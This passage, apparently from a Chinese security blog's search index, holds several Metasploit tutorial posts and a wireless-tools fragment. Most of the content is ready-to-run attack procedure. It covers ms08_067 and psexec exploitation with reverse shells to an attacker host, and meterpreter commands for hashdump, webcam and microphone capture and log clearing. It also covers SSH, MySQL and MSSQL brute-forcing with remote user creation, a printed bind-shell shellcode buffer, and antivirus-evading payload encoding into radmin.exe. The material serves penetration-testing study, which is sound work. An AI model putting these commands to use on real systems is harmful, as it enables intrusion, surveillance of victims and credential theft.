falseexploit#SSH 公钥登录use auxiliary/scanner/ssh/ssh_login_pubkeyset KEY_FILE id_rsaset USERNAME rootrun</code></pre><h5 id="获取Windows缺少的系统补丁"><a href="#获取Windows缺少的系统补丁" class="headerlink" title="获取Windows缺少的系统补丁"></a><strong>获取Windows缺少的系统补丁</strong></h5><ul><li>基于已经取得的session进行检测</li></ul><pre><code>use post/windows/gather/enum_patchesshow advancedset session 1set VERBOSE yesrun</code></pre><p><strong>检查失败</strong></p><ul><li>Known bug in WMI query, try migrating to another process</li><li>迁移到另一个进程再次尝试</li></ul><h5 id="SQL-server"><a href="#SQL-server" class="headerlink" title="SQL server"></a><strong>SQL server</strong></h5><pre><code>#Mssql扫描端口#TCP 1433(动态端口) / UDP 1434 (查询TCP端口号)use auxiliary/scanner/mssql/mssql_ping#爆破mssql密码use auxiliary/scanner/mssql/mssql_login#远程执行代码use auxiliary/admin/mssql/mssql_execset CMD net user user pass /ADD</code></pre><h5 id="FTP模块"><a href="#FTP模块" class="headerlink" title="FTP模块"></a><strong>FTP模块</strong></h5><pre><code>#FTP版本扫描use auxiliary/scanner/ftp/ftp_version        #版本扫描use auxiliary/scanner/ftp/anonymous            #匿名登录扫描use auxiliary/scanner/ftp/ftp_login            #登录爆破use auxiliary/scanner/ [tab]    Display all 572 possibilities? (y or n)</code></pre>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 漏洞利用 </category>
          
          <category> MSF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MSF </tag>
            
            <tag> nmap </tag>
            
            <tag> sniffer </tag>
            
            <tag> auxiliary </tag>
            
            <tag> ssh密码爆破 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>meterpreter基本命令及其Python扩展</title>
      <link href="/2016/03/06/Exploits/MsF/meterpreter%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4%E5%8F%8A%E5%85%B6Python%E6%89%A9%E5%B1%95/"/>
      <url>/2016/03/06/Exploits/MsF/meterpreter%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4%E5%8F%8A%E5%85%B6Python%E6%89%A9%E5%B1%95/</url>
      
        <content type="html"><![CDATA[<h4 id="Meterpreter"><a href="#Meterpreter" class="headerlink" title="Meterpreter"></a><strong>Meterpreter</strong></h4><p><strong>高级,动态,可扩展的payload</strong></p><ul><li>基于meterpreter上下文利用更多漏洞发起攻击</li><li>后渗透测试阶段一站式操作界面</li></ul><p><strong>完全基于内存的DLL注入式payload</strong> (不写硬盘)</p><ul><li>注入合法系统进程并建立stager</li><li>基于Stager上传和预加载DLL进行扩展模块的注入(客户端API)</li><li>基于Stager建立的socket连接建立加密的TLS/1.0通信隧道</li><li>利用TLS隧道进一步加载后续扩展模块(避免网络取证)</li></ul><p><strong>服务端使用C语言编写</strong></p><ul><li>客户端提供基于ruby的全特性API(支持任何语言)</li></ul><h4 id="meterpreter基本命令"><a href="#meterpreter基本命令" class="headerlink" title="meterpreter基本命令"></a><strong>meterpreter基本命令</strong></h4><p><strong>以ms08_067漏洞测试获取一个meterpreter会话</strong></p><pre><code>msfconsolesearch 08-067use exploit/windows/smb/ms08_067_netapishow optionsset rhost 192.168.254.113set target 34set paylaod windows/meterpreter/reverse_tcpset lhsot 192.168.254.118set lport 6666exploit -j sessions -i 1</code></pre><p><strong>基本命令</strong></p><pre><code>help / ?        #查看使用帮助    background        #将meterpreter终端隐藏在后台（快捷键ctrl+z）sessions        #查看已经成功获得的会话，如果想继续与某会话交互，可以使用sessions -i 命令.quit / exit        #直接关闭当前的meterpreter会话，返回MSF终端.run                #执行meterpreter模块或脚本run post/windows/gather/hashdump    #获取目标机器hash密码bgrun            #后台执行meterpreter模块或脚本bgrun vnc        #VNC远程监控bgrun service_manager -l     #查看目标系统已有服务,可以创建自启动或开启停止服务.bglist            #提供所有正在运行的后台脚本的列表bgkill             #杀死一个背景 meterpreter 脚本channel         #显示活动频道interact         #与通道进行交互write             #将数据写入到一个通道read             #从通道读取数据close             #关闭通道use             #加载 meterpreter 的扩展clearev            #清除目标系统日志shell            #获取目标系统的控制台shell.resource -r r.txt    #调用资源文件ldletime        #查看目标机器空闲时间,判断电脑前是否有人record_mic        #录制目标麦克风,窃取声音信息webcam_list     #列出摄像头设备webcam_snap -i 1 -v false    #使用摄像头监控irb                #在meterpreter会话与ruby终端交互.load            #加载扩展插件</code></pre><p><strong>文件系统命令</strong></p><pre><code>cd            #访问目标文件夹路径pwd            #查看目标当前路径#攻击者本机命令前加l,意为local本地lcd         #访问攻击者本机路径lpwd        #查看攻击者本机路径ls / dir    #查看目标文件列表.cat            #查看目标文件内容.mkdir        #在目标机器创建目录.mv            #移动文件或改名getwd        #获得目标机器上当前的工作目录，getlwd，这个命令可以获得当前系统的工作目录.upload        #可以上传文件或文件夹到目标机器上;upload 要上传的文件 C:\Users\buzz\Desktopdownload    #从目标机器上下载文件或文件夹，注意windows路径要用双斜杠进行转义. download C:\\test.txt /root/home/testedit        #调用vi编辑器，对目标机器上的文件进行编辑;edit c:\\windows\\system32\\drivers\\etc\\hostssearch        #可通过search -h查看帮助信息,参数-d指定搜索的起始目录或驱动，如果为空，将进行全盘搜索；参数-f指定搜索的文件或部分文件名，支持星号(*)匹配；参数-r递归搜索子目录.search -d c:\\windows -f *.txtrm / del    #删除目标机器的文件.rmdir /s/q c:\\test    #进入shell后使用此命令可以删除目录下的所有文件和文件夹，/s表示所有子目录和文件/q表示安静模式，不显示yes or no.</code></pre><p><strong>网络命令</strong></p><pre><code>arp            #查看APR缓存netstat        #查看网络连接情况ifconfig    #查看目标机器网络接口信息portfwd        #它是meterpreter自带的端口转发器，用于把目标机器的端口转发到本地端口；假设目标机开放了3389端口，使用如下命令将其转发到本地3456端口：portfwd add -l 3456 -p 3389 -r 192.168.88.110rdesktop -u 用户名 -p 密码 ip:端口          #连接开启远程桌面的windows系统.route        #显示目标机器的路由信息.</code></pre><p><strong>系统命令</strong></p><pre><code>ps            #用于获得目标主机上正在运行的进程信息.migrate pid    #将Meterpreter会话从一个进程迁移到另一个进程的内存空间中，可以配合ps -ef |grep explorer.exeexecute        #在目标机器上执行文件.    execute -H -i -f cmd.exe         #直接与cmd进行交互,参数-H 表示隐藏执行 -i 表示直接与cmd交互.#另外execute命令的-m参数支持直接从内存中执行攻击者的可执行文件.execute -H -m -d regedit.exe -f hidden_shell.exegetprivs    #查看获取的权限getproxy    #获取代理信息getsystem    #获取系统权限getpid        #获得当前会话所在进程的PID值.kill        #用于终结指定的PID进程.getuid        #用于获得运行meterpreter会话的用户名，从而查看当前会话具有的权限.sysinfo        #用于得到目标系统的一些信息，例如机器名，操作系统等.show_mount    #展示已挂载磁盘reboot        #重启目标机器shutdown    #关闭目标机器</code></pre><h4 id="Meterpreter-python扩展"><a href="#Meterpreter-python扩展" class="headerlink" title="Meterpreter python扩展"></a><strong>Meterpreter python扩展</strong></h4><ul><li>2015年11月份,来自社区的贡献</li><li>无需运行环境,在客户端运行原生python代码</li></ul><pre><code>load pythonhelppython_execute &quot;print(hello world)&quot;python_execute &quot;import os; cd=os.getcwd()&quot; -r cdpython_import -f find.py</code></pre>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 漏洞利用 </category>
          
          <category> MSF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MSF </tag>
            
            <tag> payload </tag>
            
            <tag> python </tag>
            
            <tag> meterpreter </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MSF生成和使用payload</title>
      <link href="/2016/03/05/Exploits/MsF/MSF%E7%94%9F%E6%88%90%E5%92%8C%E4%BD%BF%E7%94%A8payload/"/>
      <url>/2016/03/05/Exploits/MsF/MSF%E7%94%9F%E6%88%90%E5%92%8C%E4%BD%BF%E7%94%A8payload/</url>
      
        <content type="html"><![CDATA[<h4 id="生成payload"><a href="#生成payload" class="headerlink" title="生成payload"></a><strong>生成payload</strong></h4><pre><code>msfconsoleuse payload/windows/shell_bind_tcp        #选择使用payload模块generate            #生成默认输出ruby语言shellcodegenerate -f c        #生成C语言的shellcodegenerate -f python    #生成python语言shellcodegenerate -f jav        #生成java语言shellcodegenerate -f exe        #生成为EXE可执行文件generate -h</code></pre><ul><li><p>默认输出为ruby语言16进制shellcode</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># windows/shell_bind_tcp - 328 bytes</span></span><br><span class="line"><span class="comment"># https://metasploit.com/</span></span><br><span class="line"><span class="comment"># VERBOSE=false, LPORT=4444, RHOST=, PrependMigrate=false, </span></span><br><span class="line"><span class="comment"># EXITFUNC=process, CreateSession=true</span></span><br><span class="line">buf = </span><br><span class="line"><span class="string">"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50"</span> +</span><br><span class="line"><span class="string">"\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26"</span> +</span><br><span class="line"><span class="string">"\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7"</span> +</span><br><span class="line"><span class="string">"\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78"</span> +</span><br><span class="line"><span class="string">"\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3"</span> +</span><br><span class="line"><span class="string">"\x3a\x49\x8b\x34\x8b\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01"</span> +</span><br><span class="line"><span class="string">"\xc7\x38\xe0\x75\xf6\x03\x7d\xf8\x3b\x7d\x24\x75\xe4\x58"</span> +</span><br><span class="line"><span class="string">"\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3"</span> +</span><br><span class="line"><span class="string">"\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a"</span> +</span><br><span class="line"><span class="string">"\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb\x8d\x5d\x68\x33\x32"</span> +</span><br><span class="line"><span class="string">"\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff"</span> +</span><br><span class="line"><span class="string">"\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b"</span> +</span><br><span class="line"><span class="string">"\x00\xff\xd5\x6a\x08\x59\x50\xe2\xfd\x40\x50\x40\x50\x68"</span> +</span><br><span class="line"><span class="string">"\xea\x0f\xdf\xe0\xff\xd5\x97\x68\x02\x00\x11\x5c\x89\xe6"</span> +</span><br><span class="line"><span class="string">"\x6a\x10\x56\x57\x68\xc2\xdb\x37\x67\xff\xd5\x57\x68\xb7"</span> +</span><br><span class="line"><span class="string">"\xe9\x38\xff\xff\xd5\x57\x68\x74\xec\x3b\xe1\xff\xd5\x57"</span> +</span><br><span class="line"><span class="string">"\x97\x68\x75\x6e\x4d\x61\xff\xd5\x68\x63\x6d\x64\x00\x89"</span> +</span><br><span class="line"><span class="string">"\xe3\x57\x57\x57\x31\xf6\x6a\x12\x59\x56\xe2\xfd\x66\xc7"</span> +</span><br><span class="line"><span class="string">"\x44\x24\x3c\x01\x01\x8d\x44\x24\x10\xc6\x00\x44\x54\x50"</span> +</span><br><span class="line"><span class="string">"\x56\x56\x56\x46\x56\x4e\x56\x56\x53\x56\x68\x79\xcc\x3f"</span> +</span><br><span class="line"><span class="string">"\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff\x30\x68\x08\x87\x1d"</span> +</span><br><span class="line"><span class="string">"\x60\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff"</span> +</span><br><span class="line"><span class="string">"\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72"</span> +</span><br><span class="line"><span class="string">"\x6f\x6a\x00\x53\xff\xd5"</span></span><br></pre></td></tr></table></figure></li><li><p>MSF自动选择编码模块绕过坏字符</p></li></ul><pre><code>generate -b &apos;\x00&apos;generate -b &apos;\x00\x44\x67\x66\xfa\x01\xe0\x44\x67\xa1\xa2\xa3\x75\x4b&apos;generate -b &apos;\x00\x44\x67\x66\xfa\x01\xe0\x44\x67\xa1\xa2\xa3\x75\x4b\xFF\x0a\x0b\x01\xcc\6e\x1e\x2e\x26&apos;</code></pre><p><strong>直接使用payload</strong></p><ul><li>手动指定编码模块</li></ul><pre><code>show encoders        #显示可用编码模块generate -e x86/nonalpha    #-e参数指定编码模块generate -b &apos;\x00&apos; -f exe -e x86/shikata_ga_nai -i 5 -k -x /usr/share/windows-binaries/radmin.exe -o /root/1.exenc targetIP 4444</code></pre><p><strong>NOP</strong>: no-operation / Next Operation (无任何操作)</p><ul><li>EIP返回到存储NOP sled的任意地址时将递增,最终导致shellcode执行</li></ul><pre><code>generate -s 14</code></pre>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 漏洞利用 </category>
          
          <category> MSF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MSF </tag>
            
            <tag> payload </tag>
            
            <tag> ruby </tag>
            
            <tag> shellcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MSF之Exploit模块</title>
      <link href="/2016/03/04/Exploits/MsF/MSF%E4%B9%8BExploit%E6%A8%A1%E5%9D%97/"/>
      <url>/2016/03/04/Exploits/MsF/MSF%E4%B9%8BExploit%E6%A8%A1%E5%9D%97/</url>
      
        <content type="html"><![CDATA[<h4 id="Exploit模块"><a href="#Exploit模块" class="headerlink" title="Exploit模块"></a><strong>Exploit模块</strong></h4><p><strong>Active Exploit</strong>    主动利用</p><pre><code>#smb漏洞,直接利用达到控制目标,类似永恒之蓝use exploit/windows/smb/psexec            set rhost 192.168.254.113set payload windows/shell/reverse_tcpset lhost 192.168.254.118set lport 4444set SMBUSER user1set SMBPASS pass1exploit</code></pre><p><strong>Passive Exploits</strong>    被动利用</p><pre><code>#针对早期IE6,IE7浏览器漏洞,诱使目标访问URL即可控制目标use exploit/windows/browser/ms07_017_ani_loadimage_chunksize    set URIPATH /set PAYLOAD windows/shell/reverse_tcpset LHOST 192.168.254.111set LPORT 4444exploit</code></pre>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 漏洞利用 </category>
          
          <category> MSF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MSF </tag>
            
            <tag> exploit </tag>
            
            <tag> ms07_017 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MSF基本使用和控制台命令</title>
      <link href="/2016/03/04/Exploits/MsF/MSF%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8%E5%92%8C%E6%8E%A7%E5%88%B6%E5%8F%B0%E5%91%BD%E4%BB%A4/"/>
      <url>/2016/03/04/Exploits/MsF/MSF%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8%E5%92%8C%E6%8E%A7%E5%88%B6%E5%8F%B0%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<blockquote><h4 id="MSF基本使用"><a href="#MSF基本使用" class="headerlink" title="MSF基本使用"></a>MSF基本使用</h4></blockquote><ul><li><p>使用前先升级: <code>msfupdate</code></p></li><li><p>msfcli 使用接口</p></li><li><p>msfconsole 使用接口<br>  最流行的用户接口<br>  几乎可以使用全部的MSF功能<br>  控制台命令支持TAB自动补齐<br>  支持外部命令的执行(系统命令等)<br>  点击鼠标启动 <code>/ msfconsole -h -q -r -v / exit</code><br>  <code>help / ? / workspace</code></p></li><li><p><code>banner , color , connect -h</code>        </p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">connect 1.1.1.1 80#connect类似nc</span><br></pre></td></tr></table></figure><h4 id="msfconsole-控制台命令"><a href="#msfconsole-控制台命令" class="headerlink" title="msfconsole 控制台命令"></a>msfconsole 控制台命令</h4><p><strong>show</strong>    #使用频率高</p><pre><code>show all            #显示所有模块show exploits        #显示可利用模块show payloads        #显示可用payload模块show auxiliary        #显示可用辅助模块    show options        #显示选项show encoders        #显示可用编码模块show nops            #显示nops模块show plugins        #显示可用插件</code></pre><p><strong>search</strong>        搜索命令</p><pre><code>search -hsearch ms10-046            #根据关键字搜索search ms08-067search usermap_scriptsearch name:mysql        #搜索名称包含search platform:aix        #根据平台搜索search type:aux            #根据类型搜索search author:aaron        #根据作者名搜索search cve:2011            #根据cve时间搜索                        #可多条件同时搜索</code></pre><p><strong>use</strong>    使用</p><pre><code>use exploit/windows/smb/ms08_067_netapi            #search找到目标模块后use它use auxiliary/dos/windows/smb/ms09_001_write    info            #查看当前模块信息    info edit        #编辑模块信息    show options    #显示当前模块配置选项    show targets    #显示当前模块适用攻击目标    show payload    #显示当前模块适用的payload    show advanced    #显示当前模块高级参数    show missing    #显示当前模块未配置参数    show evasion    #逃避    set rhost 1.1.1.1    #设置当前模块目标IP    chack                #检查配置    back                #返回上一级命令</code></pre><p><strong>msf数据库相关命令</strong></p><pre><code>service postgresql start    #启动postgresql数据库msfdb init        #初始化msf数据库msfdb reinit    #重新初始化msfdb start        #启动msfdb stop        #停止msfdb delete    #删除数据库msfdb status    #查看服务状态msfdb run        #启动数据库并启动msfconsoledb_status            #查看数据库状态db_rebuild_cache    #创建数据库缓存,MSF5不推荐使用此命令db_disconnect        #断开数据连接db_connect -h        #连接其它数据库    /usr/share/metasploit-framework/config/database.yml    #指定数据库连接配置文件进行连接db_nmap 1.1.1.1                    #使用nmap扫描并将扫描结果储存到msf数据库    hosts                        #扫描后,hosts查看所有目标机器信息    hosts 192.168.254.254        #指定目标IP查看    hosts -u                    #只看up开机状态的机器    hosts -c address,os_name    #筛选只看IP和系统类型    hosts -S windows            #搜索指定信息查看    services -h                    #和hosts命令类似    services -p 80                #只看开放80端口的机器    services -p 1-200            #指定端口范围查看    services -c port,info,name     #筛选信息查看db_import                        #导入数据    #结合nmap扫描并输出结果为xml    nmap -A 192.168.254.113 -oX namp.xml        db_import /root/nmap.xml    #导入nmap扫描结果db_export -h                        db_export -f xml /root/bak.xml    #导出备份数据</code></pre><p><strong>set</strong> 设置</p><pre><code>set        #设置unset    #取消设置setg    #全局变量设置unsetg    #取消全局变量设置save    #保存配置,下次启动MSF不用重新设置</code></pre><p><strong>执行</strong></p><pre><code>runexploitexploit -j    #后台执行jobs            #查看已执行的任务sessions -l        #查看已建立连接的会话sessions -i 1    #进入已建立连接的会话load            #加载插件load openvas    #加载openvasunload            #取消加载的插件loadpath        #加载路径自定义插件route            #通过指定sessions路由流量route add 10.1.1.0 255.255.255.0 1irb                #开发接口    Framework::Version    puts &apos;hello world&apos;resource r.rc        #调用资源文件msfconsol -r r.rc    #调用资源文件</code></pre><p><strong>msf爆破mysql空密码测试</strong></p><pre><code>msfconsolesearch mysql_loginuse auxiliary/scanner/mysql/mysql_loginshow optionsset USERNAME rootset BLANK_PASSWORDS trueset rhost 192.168.254.113exploit -jcreds        #查看扫描出的密码信息vulns        #查看目标漏洞信息loot        #查看获取的hashdump</code></pre><h4 id="Msfcli"><a href="#Msfcli" class="headerlink" title="Msfcli"></a><strong>Msfcli</strong></h4><ul><li>2015年6月已经被取消</li><li>由msfconsole -x 取代</li><li>编写脚本时便于引用</li></ul><p>msfconsole -x “use exploit/windows/smb/ms08_067_netapi; set RHOST 1.1.1.1; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 1.1.1.8; set LPORT 5555; set target 34; exploit”</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 漏洞利用 </category>
          
          <category> MSF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MSF </tag>
            
            <tag> nmap </tag>
            
            <tag> Kali </tag>
            
            <tag> Metasploit </tag>
            
            <tag> msfconsole </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MSF架构和技术功能模块</title>
      <link href="/2016/03/04/Exploits/MsF/MSF%E6%9E%B6%E6%9E%84%E5%92%8C%E6%8A%80%E6%9C%AF%E5%8A%9F%E8%83%BD%E6%A8%A1%E5%9D%97/"/>
      <url>/2016/03/04/Exploits/MsF/MSF%E6%9E%B6%E6%9E%84%E5%92%8C%E6%8A%80%E6%9C%AF%E5%8A%9F%E8%83%BD%E6%A8%A1%E5%9D%97/</url>
      
        <content type="html"><![CDATA[<h4 id="MSF架构"><a href="#MSF架构" class="headerlink" title="MSF架构"></a><strong>MSF架构</strong></h4><p><img src="https://github.com/iseanhe/iseanhe.github.io/raw/master/img/mdphotos/msf.png" alt="MSF架构"></p><p><strong>Rex</strong></p><ul><li>基本功能库,用于完成日常基本任务,无需人工手动编码实现</li><li>处理socket连接访问,协议应答(http/SSL/SMB等)</li><li>编码转换(XOR,Base64,Unicode)</li></ul><p><strong>MsF::Core</strong></p><ul><li>提供MsF的核心基本API,是框架的核心能力实现库</li></ul><p><strong>MsF::Base</strong></p><ul><li>提供友好的API接口,便于模块调用的库</li></ul><p><strong>Plugin 插件</strong></p><ul><li>连接和调用外部扩展功能和系统</li></ul><h4 id="MSF目录结构"><a href="#MSF目录结构" class="headerlink" title="MSF目录结构"></a><strong>MSF目录结构</strong></h4><pre><code>cd /usr/share/metasploit-framework/ &amp;&amp; lsls modules    #模块目录</code></pre><p><strong>技术功能模块</strong>    (不是流程模块)</p><ul><li><p>Exploits: 利用系统漏洞进行攻击的动作,此模块对应每一个具体漏洞的攻击方法(主动,被动)</p></li><li><p>Payload: 成功exploit之后,真正在目标系统执行的代码或指令<br>  shellcode或系统命令<br>  三种payload: <code>cd /usr/share/metasploit-framework/modules/payloads/ &amp;&amp; ls</code></p><p>  Single: all-in-one<br>  Stager: 目标计算机内存有限时,先传输一个较小的payload用于建立连接<br>  Stages: 利用stager建立的连接下载的后续payload<br>  Stager,stages都有多种类型,适用于不同场景<br>  Shellcode 是payload的一种,由于其建立正向/反向shell而得名</p></li><li><p>Auxiliary: 执行信息收集,枚举,指纹探测,扫描等功能的辅助模块(没有payload的exploit模块)</p></li><li><p>Encoders: 对payload进行加密,躲避AV检查的模块</p></li><li><p>Nops: 提高payload稳定性及维持大小</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 漏洞利用 </category>
          
          <category> MSF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MSF </tag>
            
            <tag> payload </tag>
            
            <tag> exploit </tag>
            
            <tag> shellcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Metasploit简介及版本</title>
      <link href="/2016/03/03/Exploits/MsF/Metasploit%E7%AE%80%E4%BB%8B%E5%8F%8A%E7%89%88%E6%9C%AC/"/>
      <url>/2016/03/03/Exploits/MsF/Metasploit%E7%AE%80%E4%BB%8B%E5%8F%8A%E7%89%88%E6%9C%AC/</url>
      
        <content type="html"><![CDATA[<blockquote><h4 id="渗透测试者的困扰"><a href="#渗透测试者的困扰" class="headerlink" title="渗透测试者的困扰"></a><strong>渗透测试者的困扰</strong></h4></blockquote><ul><li>需要掌握数百个工具软件,上千个命令参数,实在记不住</li><li>新出现的漏洞PoC/EXP有不同的运行环境要求,准备工作繁琐</li><li>大部分时间都在学习不同工具的使用习惯,如果能统一就好了</li><li>Metasploit 能解决以上困扰吗?</li></ul><h4 id="Metasploit简介"><a href="#Metasploit简介" class="headerlink" title="Metasploit简介"></a><strong>Metasploit简介</strong></h4><ul><li><p>目前最流行,最强大,最具扩展性的渗透测试平台软件</p></li><li><p>基于Metasploit惊醒渗透测试和漏洞分析的流程和方法</p></li><li><p>2003年由HD Moore发布第一版,2007年用ruby语言重写<br>  框架集成了渗透测试标准(PETS)思想<br>  一定程度上统一了渗透测试和漏洞研究的工作环境<br>  新的攻击代码可以比较容易的加入框架</p></li><li><p>开发活跃版本更新频繁(每周)<br>  早期版本基于社区力量维护,被Rapid 7收购后打造出其商业版产品<br>  目前分化为四个版本,社区版依然十分活跃<br>  HD More说: 为Metasploit写书是种自虐!<br>  2014年之后市场上没有再出现新的Metasploit教材</p></li><li><p>Offensive security 出版的Metasploit教材</p></li><li><p>被HD Moore称之为当时最好的Metasploit教材(2011/2012)</p></li></ul><h4 id="版本对比"><a href="#版本对比" class="headerlink" title="版本对比"></a><strong>版本对比</strong></h4><table><thead><tr><th align="center">Feature</th><th align="center">Metasploit Framework</th><th align="center">Metasploit Community</th><th align="center">Metasploit Express</th><th align="center">Metasploit Pro</th></tr></thead><tbody><tr><td align="center">License</td><td align="center">Free</td><td align="center">Free</td><td align="center">$5,000</td><td align="center">授权</td></tr><tr><td align="center">Web APP测试</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center">Y</td></tr><tr><td align="center">Report</td><td align="center"></td><td align="center"></td><td align="center">Y</td><td align="center">Y</td></tr><tr><td align="center">AV免杀</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center">Y</td></tr><tr><td align="center">操作界面</td><td align="center">Command-line</td><td align="center">Web</td><td align="center">Web</td><td align="center">Web/cmd/adv cmd</td></tr><tr><td align="center">IDS/IPS绕过</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center">Y</td></tr><tr><td align="center">社区支持</td><td align="center">Y</td><td align="center">Y</td><td align="center">Y</td><td align="center">Y</td></tr><tr><td align="center">Rapid7支持</td><td align="center"></td><td align="center"></td><td align="center">Y</td><td align="center">Y</td></tr><tr><td align="center">团队协作</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center">Y</td></tr><tr><td align="center">VPN Pivoting</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center">Y</td></tr></tbody></table><h4 id="Metasploit-Framework"><a href="#Metasploit-Framework" class="headerlink" title="Metasploit Framework"></a><strong>Metasploit Framework</strong></h4><ul><li>MSF 默认集成于Kali Linux中</li><li>使用postgresql数据库存储数据<br>  早期版本需要先启动数据库再启动msf</li></ul><pre><code>msfdb init        #初始化msf数据库msfdb reinit    #重新初始化msfdb start        #启动msfdb stop        #停止msfdb delete    #删除数据库msfdb status    #查看服务状态msfdb run        #启动数据库并启动msfconsole</code></pre>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 漏洞利用 </category>
          
          <category> MSF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MSF </tag>
            
            <tag> Kali </tag>
            
            <tag> ruby </tag>
            
            <tag> Metasploit </tag>
            
            <tag> postgresql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>wIDS无线入侵检测系统及中继和重放</title>
      <link href="/2015/09/21/Wireless_Attacks/wIDS%E6%97%A0%E7%BA%BF%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%E7%B3%BB%E7%BB%9F%E5%8F%8A%E4%B8%AD%E7%BB%A7%E5%92%8C%E9%87%8D%E6%94%BE/"/>
      <url>/2015/09/21/Wireless_Attacks/wIDS%E6%97%A0%E7%BA%BF%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%E7%B3%BB%E7%BB%9F%E5%8F%8A%E4%B8%AD%E7%BB%A7%E5%92%8C%E9%87%8D%E6%94%BE/</url>
      
        <content type="html"><![CDATA[<ul><li><p>去除802.11头</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airdecap-ng -b &lt;AP MAC&gt; 1.pcap</span><br></pre></td></tr></table></figure></li><li><p>解密WEP加密数据</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">airdecap-ng -w &lt;WEP key&gt; -b &lt;AP MAC&gt; 1.pcap</span><br><span class="line">#必须有与AP建立关联关系</span><br></pre></td></tr></table></figure></li><li><p>解密WPA加密数据</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airdecap-ng -e kifi -p &lt;PSK&gt; -b &lt;AP MAC&gt; 1.pcap</span><br></pre></td></tr></table></figure><ul><li>抓包文件中必须包含4步握手信息,否则无解</li></ul></li></ul><h4 id="AIRSERV-NG"><a href="#AIRSERV-NG" class="headerlink" title="AIRSERV-NG"></a><strong>AIRSERV-NG</strong></h4><ul><li><p>通过网络提供无线网卡服务器</p><ul><li>某些网卡不支持客户端/服务器模式</li></ul></li><li><p>启动无线侦听</p></li><li><p>服务器端</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airserv-ng -p 3333 -d wlan2mon</span><br></pre></td></tr></table></figure></li><li><p>客户端</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airodump-ng 192.168.1.1:3333</span><br></pre></td></tr></table></figure></li><li><p>某些防火墙会影响C / S间的通信</p></li></ul><blockquote><h4 id="AIRTUN-NG"><a href="#AIRTUN-NG" class="headerlink" 